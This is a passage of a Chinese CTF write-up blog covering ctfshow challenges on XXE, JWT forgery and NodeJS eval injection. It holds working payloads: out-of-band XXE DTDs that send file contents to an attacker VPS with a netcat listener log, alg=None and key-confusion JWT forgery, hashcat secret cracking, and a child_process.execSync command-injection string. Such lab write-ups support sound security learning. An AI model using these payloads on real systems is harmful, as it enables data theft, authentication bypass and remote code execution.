filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; objectInputStream.readObject();        return obj;    &#125;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        deserialize(filename);    &#125;&#125;</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><blockquote><p>ctfshow web846</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705919075679-2e31b01d-31d4-4658-88c8-7ec122a03666.png" alt="image.png"><br>修改serialize代码：</p><pre class="language-java" data-language="java"><code class="language-java">public static void serialize(Object obj) throws IOException&#123;        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(obj);        objectOutputStream.flush();        objectOutputStream.close();        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));    &#125;</code></pre><p>来方便查看输出的内容。<br>post传入输出的内容即可：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705919699691-9b7f04cb-a231-41c6-b870-4e7ea3731298.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web373-web378XXE篇</title>
      <link href="/posts/f5628547/"/>
      <url>/posts/f5628547/</url>
      
        <content type="html"><![CDATA[<h1 id="知识了解"><a href="#知识了解" class="headerlink" title="知识了解"></a>知识了解</h1><blockquote><p>可以参考这个：<br><a href="https://blog.csdn.net/hk41666/article/details/125832666">https://blog.csdn.net/hk41666/article/details/125832666</a><br><a href="https://blog.csdn.net/weixin_44420143/article/details/118721145">https://blog.csdn.net/weixin_44420143&#x2F;article&#x2F;details&#x2F;118721145</a></p></blockquote><p>XXE(XML外部实体注入)是一种针对XML文档的攻击方式,能够使攻击者利用XML解析器的漏洞读取本地文件或者远程请求。<br>XXE攻击的原理是:</p><ul><li>XML文档可以包含DOCTYPE定义,里面可以引用外部实体。</li><li>XML解析器在解析文档时,会根据DOCTYPE中的引用去获取外部资源。</li><li>攻击者可以构造恶意的外部实体引用,让解析器去读取本地文件,或者发起请求到内网服务器。</li><li>如果解析器没有禁用外部实体的加载,就可能导致文件内容泄露或远程代码执行。</li></ul><p>XXE攻击的危害包括:</p><ul><li>读取系统敏感文件,如&#x2F;etc&#x2F;passwd</li><li>利用文件协议读取本地文件</li><li>端口扫描、对内网网站进行攻击</li><li>攻击内网应用、数据库</li><li>执行远程代码,调用恶意脚本</li></ul><p>防范XXE攻击的方法:</p><ul><li>对不可信XML输入进行验证,过滤….\等威胁</li><li>禁用解析器的外部实体加载功能</li><li>使用安全的XML解析器,如defuse xml等</li><li>避免上传XML文件或禁用DOCTYPE</li><li>输出时进行过滤,移除POTENTIAL XXE payload</li></ul><h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);if(isset($xmlfile))&#123;    $dom &#x3D; new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds &#x3D; simplexml_import_dom($dom);    $ctfshow &#x3D; $creds-&gt;ctfshow;    echo $ctfshow;&#125;highlight_file(__FILE__);    </code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE  xxe [&lt;!ENTITY xee SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;aaa&gt;&lt;ctfshow&gt;&xee;&lt;&#x2F;ctfshow&gt;&lt;&#x2F;aaa&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1700380608870-4cb380a0-e59b-42ee-9889-bb2a1cbf780d.png" alt="image.png"></p><h1 id="web374-web376"><a href="#web374-web376" class="headerlink" title="web374-web376"></a>web374-web376</h1><p>无回显，需要创建一条外带信道来提取数据。<br>创建一个1.php内容：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php file_put_contents(&quot;test.txt&quot;, $_GET[&#39;file&#39;]) ; ?&gt;</code></pre><p>xxe.dtd文件：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &#x25; xxe  SYSTEM &#39;http:&#x2F;&#x2F;[vps-ip]&#x2F;1.php?file&#x3D;%file;&#39;&gt; &quot;&gt;%dtd;%xxe;</code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM &quot;http:&#x2F;&#x2F;[vps-ip]&#x2F;xxe.dtd&quot;&gt;%aaa;]&gt;&lt;root&gt;123&lt;&#x2F;root&gt;</code></pre><p>将两个外部实体 (%file 和 %aaa) 引入 XML 文档中<br>%file 定义了一个实体，用于读取位于 &#x2F;flag 路径下的文件并对其进行 base64 编码，则该文件的内容将以 base64编码的形式显示在 XML 响应中。<br>%aaa 定义了一个实体，指向远程 XML 文档。如果能够成功地利用此漏洞执行 XXE 攻击，则远程 XML 文档的内容将被解析并包含在XML 响应中。<br>payload中创建两个实体 通过%aaa访问了xxe.dtd<br>然后在xxe.dtd中引用了1.php，在1.php中实现了将get传入的file值输出在text.txt中，此时的get值就是payload中定义的file的实体的值，也就是说这里实现了对于flag文件的读取并且传递值给了file变量<br>~~但是这个我就是成功不了，test.txt出来的是index.php页面。 ~~docker的权限不足，给那个www目录足够权限即可。<br>剩余的<br>于是又再网上找了个打法：<br>payload</p><pre class="language-php" data-language="php"><code class="language-php">&lt;!DOCTYPE root [&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;test.dtd&quot;&gt;%aaa;]&gt;&lt;root&gt;1&lt;&#x2F;root&gt;</code></pre><p>test.dtd:</p><pre class="language-php" data-language="php"><code class="language-php">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &#x25; xxe  SYSTEM &#39;http:&#x2F;&#x2F;xxx:8888&#x2F;%file;&#39;&gt; &quot;&gt;%dtd;%xxe;</code></pre><p>这个8888端口监听一下内容：</p><pre class="language-php" data-language="php"><code class="language-php">[root@iZf8z6xc36jyvoqjdvolkiZ www]# nc -lvnp 8888Ncat: Version 7.91 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Listening on :::8888Ncat: Listening on 0.0.0.0:8888Ncat: Connection from 124.223.158.81.Ncat: Connection from 124.223.158.81:48628.GET &#x2F;Y3Rmc2hvd3swOWU5NTllMy1iZGJmLTRlZTktOTc2Ni00NWE3ODQ2YWNjYWJ9Cg&#x3D;&#x3D; HTTP&#x2F;1.0Host: 47.115.204.101:8888Connection: close</code></pre><p>解码一下其中的base64文本。得到flag。</p><h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);if(preg_match(&#39;&#x2F;&lt;\?xml version&#x3D;&quot;1\.0&quot;|http&#x2F;i&#39;, $xmlfile))&#123;    die(&#39;error&#39;);&#125;if(isset($xmlfile))&#123;    $dom &#x3D; new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);    </code></pre><p>过滤了http 但是可以用utf-16绕过。用python脚本：</p><pre class="language-php" data-language="php"><code class="language-php">import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;0ec4fe9d-6949-4e9d-a3b1-70be3bb3f01b.challenge.ctf.show&#x2F;&#39;payload &#x3D; &#39;&#39;&#39;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;[vps-ip]&#x2F;xxe.dtd&quot;&gt;%remote;%send;]&gt;&#39;&#39;&#39;payload &#x3D; payload.encode(&#39;utf-16&#39;)rep &#x3D; requests.post(url&#x3D;url, data&#x3D;payload)print(rep.text)</code></pre><h1 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h1><p>以xml格回显：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1700389058163-935cedcd-0ef8-4e71-b0aa-95e08ff35a23.png" alt="image.png"><br>payload：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&file;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1700389263619-92a66fef-5b89-4efb-b8a8-f022df7aa4be.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web345-web350Jwt篇</title>
      <link href="/posts/280f6913/"/>
      <url>/posts/280f6913/</url>
      
        <content type="html"><![CDATA[<h1 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h1><blockquote><p><a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p></blockquote><p>jwt格式如下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">header.payload.signature</code></pre><ul><li><p>Header 通常由两部分组成:token类型和哈希算法,例如:</p><pre class="language-none"><code class="language-none">&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;</code></pre></li><li><p>Payload 负载,存放有效信息的地方,比如用户ID,用户名等。它也可以存放私有数据。</p></li><li><p>Signature 签名,是对前两部分数据签名,防止数据篡改。它由 header 和 payload 使用算法生成,例如 HMAC-SHA256。</p><pre class="language-none"><code class="language-none">标准中注册的声明 (建议但不强制使用) # iss: jwt签发者# sub: jwt所面向的用户# aud: 接收jwt的一方# exp: jwt的过期时间，这个过期时间必须要大于签发时间# nbf: 定义在什么时间之前，该jwt都是不可用的# iat: jwt的签发时间# jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</code></pre></li></ul><h1 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h1><p>源代码<code>/admin</code></p><pre class="language-none"><code class="language-none">要注意使用 url 访问网页时&#x2F;admin表示访问 admin.php 文件&#x2F;admin&#x2F;表示访问 admin&#x2F;目录下的文件，默认是 index.php很像文件夹，所以此处应该访问 &#x2F;admin&#x2F;</code></pre><p>cookie中auth：</p><pre class="language-none"><code class="language-none">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTUyOTA0NTAsImV4cCI6MTY5NTI5NzY1MCwibmJmIjoxNjk1MjkwNDUwLCJzdWIiOiJ1c2VyIiwianRpIjoiODQ1YTFjN2Q1ODY5MGQ5MGJiZWJkZjAxNWYxZWFmOTQifV0</code></pre><p><a href="https://jwt.io/">https://jwt.io/</a> 直接在线解密：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695290625614-d99069b9-f084-40a0-88a0-148e61e78765.png" alt="image.png"><br>alg显示没有加密，那就直接将sub中改为admin，再base64加密即可。<br>前部分：</p><pre class="language-none"><code class="language-none">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.WwogIHsKICAgICJpc3MiOiAiYWRtaW4iLAogICAgImlhdCI6IDE2OTUyOTExOTYsCiAgICAiZXhwIjogMTY5NTI5ODM5NiwKICAgICJuYmYiOiAxNjk1MjkxMTk2LAogICAgInN1YiI6ICJhZG1pbiIsCiAgICAianRpIjogIjk1Y2U2ZWE1ZmI1MTI0MzQxNzk5YTEwZmM5ZGM3ZTAyIgogIH0KXQ&#x3D;&#x3D;</code></pre><pre class="language-none"><code class="language-none">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0</code></pre><p>如果要有等号需要去掉等号。<br>这个上面怎么都传不进，看了视频发现，把jwt那个直接在hackbar里面base64decode一下，修改为admin，再base64加密，访问<code>/admin/</code>即可了：</p><pre class="language-none"><code class="language-none">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTUyOTIxODksImV4cCI6MTY5NTI5OTM4OSwibmJmIjoxNjk1MjkyMTg5LCJzdWIiOiJhZG1pbiIsImp0aSI6ImNmOGI3YWRmYmU1YTQwZWM1MTVjM2RiZWYxN2Y3MGE3In1d</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695292368648-e7712144-6927-4fd3-a898-f023d9111a22.png" alt="image.png"></p><h1 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h1><p>解析发现算法为 HS256 ，但是可以通过将算法设定为None来绕过签名。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698825091212-4ec0d830-aaa1-4dcb-b978-99e446ccbdd3.png" alt="image.png"><br>从上到下依次为修改算法为None， sub改为admin，然后删除签名（signature）。<br>注意保留jwt最后面的.</p><pre class="language-php" data-language="php"><code class="language-php">GET &#x2F;admin&#x2F; HTTP&#x2F;1.1Host: 82a441b0-3aca-4ca5-a55c-6d56aa369491.challenge.ctf.showCache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;118.0.0.0 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: auth&#x3D;eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNTA0NSwiZXhwIjoxNjk4ODMyMjQ1LCJuYmYiOjE2OTg4MjUwNDUsInN1YiI6ImFkbWluIiwianRpIjoiYjIwYmEzMzBiZDM4MDA1ZWFkNzVlOTQ5Y2U3ODJjZmEifQ.Connection: close</code></pre><p><code>ctfshow&#123;b94918f8-a660-4eef-91d3-04e17e3f78da&#125;</code></p><h1 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h1><p>这关无法使用绕过，但是它提示说密钥是一个弱口令。<br>编写一个纯数字字典，如果不行的话再用别的：</p><pre class="language-php" data-language="php"><code class="language-php">with open(&quot;dict.txt&quot;, &quot;a+&quot;) as f:    for i in range(0, 1000000):        f.write(str(i) + &#39;\n&#39;)</code></pre><p>然后使用hashcat爆破一下密钥：</p><pre class="language-php" data-language="php"><code class="language-php">hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNTI4MSwiZXhwIjoxNjk4ODMyNDgxLCJuYmYiOjE2OTg4MjUyODEsInN1YiI6InVzZXIiLCJqdGkiOiIzMTYzMTM4YTNkZDFkMjljNWFmMTRlZmU5MTRlYzBmOCJ9.OAWm4kUqDv4Yc6VHgs2UcYgEw-RspCJuZdtAOv5OFh4 .&#x2F;dict.txt</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698826414139-6daac597-9160-4cff-ae75-25505026087a.png" alt="image.png"><br>密码为123456，然后我们自定义一下：<br>但是bp这个不可以选择密码，还得用jwt.io来搞：（记得修改sub为admin）</p><pre class="language-php" data-language="php"><code class="language-php">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNjQ4NywiZXhwIjoxNjk4ODMzNjg3LCJuYmYiOjE2OTg4MjY0ODcsInN1YiI6ImFkbWluIiwianRpIjoiNzc0ZjIyNzgzYTJkMzJiYzgyYjhlZDk4YzVkY2FlNDAifQ.aBkzVchQIdrXUdH6HLcEc5Jm-Nq2ve63x7LnsauRkJc</code></pre><p><code>ctfshow&#123;a3bd8f39-f138-4ec8-a59a-bad1bfeb2591&#125;</code></p><h1 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h1><p>爆破，估计有字符了，那就重新再写一个字典。<br>示例代码如下：</p><pre class="language-php" data-language="php"><code class="language-php">import itertools# key &#x3D; &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;&#123;|&#125;~&#39;key &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;with open(&quot;dict_alphabet.txt&quot;, &quot;a+&quot;) as f:    passwords &#x3D; itertools.product(key, repeat&#x3D;4)    for i in passwords:        f.write(&quot;&quot;.join(i))        f.write(&quot;\n&quot;)    print(&quot;generate success&quot;)</code></pre><pre class="language-php" data-language="php"><code class="language-php">hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODg0MTE5MCwiZXhwIjoxNjk4ODQ4MzkwLCJuYmYiOjE2OTg4NDExOTAsInN1YiI6InVzZXIiLCJqdGkiOiJkNTY2Y2I1ZWExNWI0ODRmNzc5ZTBjMDE1ZjEzNTlkMCJ9.5BTUbhRJdFTlDaVlm3Sco8YhpWnkZVAkl30ISvvXjAg dict_alphabet.txt</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698841816867-3968d4dd-ecca-461f-a6ba-2f99e5be9312.png" alt="image.png"><br>密码为aaab 用相同操作进行修改内容即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698841934066-3ab25f1a-7054-4e2c-8176-258da2441517.png" alt="image.png"><br><code>ctfshow&#123;6e11c2c1-073f-48d8-8779-e0fae7897081&#125;</code></p><h1 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h1><p>有个js页面：</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;* GET home page. *&#x2F;router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var privateKey &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;&#x2F;private.key&#39;);  var token &#x3D; jwt.sign(&#123; user: &#39;user&#39; &#125;, privateKey, &#123; algorithm: &#39;RS256&#39; &#125;);  res.cookie(&#39;auth&#39;,token);  res.end(&#39;where is flag?&#39;);  &#125;);router.post(&#39;&#x2F;&#39;,function(req,res,next)&#123;var flag&#x3D;&quot;flag_here&quot;;res.type(&#39;html&#39;);var auth &#x3D; req.cookies.auth;var cert &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;public.key&#39;);  &#x2F;&#x2F; get public keyjwt.verify(auth, cert, function(err, decoded) &#123;  if(decoded.user&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;  res.end(flag);  &#125;else&#123;  res.end(&#39;you are not admin&#39;);  &#125;&#125;);&#125;);</code></pre><p>信息泄露。<br>注意这个public是不出现在路由也就是<code>xxxx.com/private.key</code></p><pre class="language-php" data-language="php"><code class="language-php">-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn&#x2F;r9D&#x2F;bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB-----END PUBLIC KEY-----</code></pre><pre class="language-php" data-language="php"><code class="language-php">-----BEGIN RSA PRIVATE KEY-----MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn&#x2F;r9D&#x2F;bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQABAoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PKfrOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAXh7iFjNscfs&#x2F;Dp&#x2F;BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydMcdEBOgkI&#x2F;E&#x2F;EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R&#x2F;hIW9JD1vlp62QiST9LU4lxAkEA1lsfr9gF&#x2F;9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdvubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA+tUDjQJAERSE&#x2F;SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJV7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIWzawYVGZdwvuD9IgY&#x2F;QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDVx+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA&#x3D;&#x3D;-----END RSA PRIVATE KEY-----</code></pre><h2 id="如何做nodejs"><a href="#如何做nodejs" class="headerlink" title="如何做nodejs"></a>如何做nodejs</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1vU4y187HE?p=5&vd_source=9c03c9cbee12e68c0989088a5b2ff127">https://www.bilibili.com/video/BV1vU4y187HE?p=5&vd_source&#x3D;9c03c9cbee12e68c0989088a5b2ff127</a></p></blockquote><p>目标目录下运行</p><pre class="language-php" data-language="php"><code class="language-php">npx express-generator</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843163505-fec5ff33-fee1-4727-a843-5a426cdbfe89.png" alt="image.png"><br>替换routes&#x2F;index.js下的内容<br>将公钥和私钥放入对应位置.<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843325306-6147461c-a9ea-4806-87c2-0fa07b7eb0e7.png" alt="image.png"><br>之前没下过包的需要npm install 一下对应包，比如那些require的内容。<br>其中fs和jwt需要申明一下变量。jwt（是jsonwebtoken）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843930640-42dacf03-16bb-4e76-aa93-400a375a1c82.png" alt="image.png"><br>这个最后我还是报错，用cyberchef搞得：</p><blockquote><p><a href="https://cyberchef.org/#recipe=JWT_Sign('-----BEGIN%20RSA%20PRIVATE%20KEY-----%5CnMIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb%2Br6QPBryJmdaR1a3ToD9sXDb%5Cneni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8%5CnIEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB%5CnAoGAE%2BmAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2%2BOhYVEJq8VtPcVB1PK%5CnfrOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX%5Cnh7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM%5CncdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi%5CnST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl%2Bl9zpo1jjzhXlwmHFgyCAn7gBKeWdv%5CnubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA%5Cn%2BtUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0%2BzdsaOqsZs60QJAYqtJ%5CnV7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4%2BQgY%2BfYBt8DVFq5bHQUIvIW%5CnzawYVGZdwvuD9IgY/QJAGCJbXA%2BKnw10B%2Bg5tDZfVHsr6YYMY3Q24zVu4JXozWDV%5Cnx%2BG39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA%3D%3D%5Cn-----END%20RSA%20PRIVATE%20KEY-----','RS256')&input=ew0KICAidXNlciI6ICJhZG1pbiIsDQogICJpYXQiOiAxNjk4ODQxOTY1DQp9">cyberchef</a></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698845146867-b28fcdc9-6919-4928-b309-59719152d0b0.png" alt="image.png"><br><code>ctfshow&#123;f7a45bf3-52c9-4bb7-87bc-ff0c2213a439&#125;</code></p><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><p>这个题也考JWT的三种常见的攻击方式之一把非对称算法 RS256 改为对称算法 HS256，用泄露的公钥签名数据，服务器尝试用公钥作为 secret 验证签名。也就是CVE-2016-5431漏洞<br><em>给定token和key检查是否valid，同时如果有callback将会调用</em><br><em>所以合法的token，在于签名是否合法，而并不取决于之前的签名采用什么样的算法，因为使用何种算法的信息也存在于给定的jwt中</em><br><em>所以只要将公钥修改为对称，然后伪造session</em><br>这里想要绕过就只能使用nodejs搭建来做了：</p><pre class="language-php" data-language="php"><code class="language-php">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;    const jwt &#x3D; require(&#39;jsonwebtoken&#39;);    const fs &#x3D; require(&#39;fs&#39;);    var privateKey &#x3D; fs.readFileSync(process.cwd()+&#39;\\public.key&#39;);&#x2F;&#x2F; console.log(privateKey);    var token &#x3D; jwt.sign(&#123; user: &#39;admin&#39; &#125;, privateKey, &#123; algorithm: &#39;HS256&#39; &#125;);    console.log(token)&#125;);</code></pre><p>注意将公钥文件放在根目录下。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web334-web344NodeJS篇</title>
      <link href="/posts/12b4f39f/"/>
      <url>/posts/12b4f39f/</url>
      
        <content type="html"><![CDATA[<h1 id="题前准备"><a href="#题前准备" class="headerlink" title="题前准备"></a>题前准备</h1><p>简单了解下node.js，我对他的了解就是写过一点点的electron，然后就是老用npm来补网易云的一些插件XD。<br>语言特性了解：</p><blockquote><p> <a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/</a></p></blockquote><p>后面几个重量级的暂时先学会利用，等语言熟悉了再跟着复现。</p><h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><h3 id="文件读取，rce拼接bypass"><a href="#文件读取，rce拼接bypass" class="headerlink" title="文件读取，rce拼接bypass"></a>文件读取，rce拼接bypass</h3><p>下载并解压相关代码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">module.exports &#x3D; &#123;  items: [    &#123;username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;&#125;  ]&#125;;</code></pre><p>尝试登录：<br>注意不要抄大写！登录之后就有flag了。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">return users.find(function(item)&#123;    return name!&#x3D;&#x3D;&#39;CTFSHOW&#39; &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;  &#125;);</code></pre><h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695202667462-f22c6299-16be-4c6a-a338-ed41039efa4b.png" alt="image.png"><br>传入之后发现是eval函数。传入1之后返回了1 。<br>这里找一找nodejs的危险函数：<br>child_process：<a href="">http://nodejs.cn/api/child_process.html</a><br><code>child_process.exec(command[, options][, callback])</code><br>命令执行：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">require(&#39;child_process&#39;).execSync(&#39;ls&#39;);</code></pre><p>payload：<code>?eval=require(&#39;child_process&#39;).execSync(&#39;tac fl00*&#39;);</code></p><h1 id="web336"><a href="#web336" class="headerlink" 